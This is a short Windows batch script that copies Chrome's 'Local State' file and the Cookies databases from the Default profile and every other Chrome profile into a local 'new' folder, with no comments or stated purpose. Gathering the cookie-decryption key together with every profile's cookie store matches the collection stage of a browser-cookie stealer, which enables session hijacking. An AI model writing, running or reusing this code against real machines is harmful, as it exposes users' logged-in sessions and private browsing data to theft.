@echo off
setlocal enabledelayedexpansion

set "script_dir=%~dp0/new"
set "source_dir=%USERPROFILE%\AppData\Local\Google\Chrome\User Data"

if not exist "%script_dir%" mkdir "%script_dir%"

copy /y "%source_dir%\Local State" "%script_dir%\Local State"

copy /y "%source_dir%\Default\Network\Cookies" "%script_dir%\Default"

for /d %%i in ("%source_dir%\Profile*") do (
    if exist "%%i\Network\Cookies" (
        copy /y "%%i\Network\Cookies" "%script_dir%\%%~nxi.db"
    )
)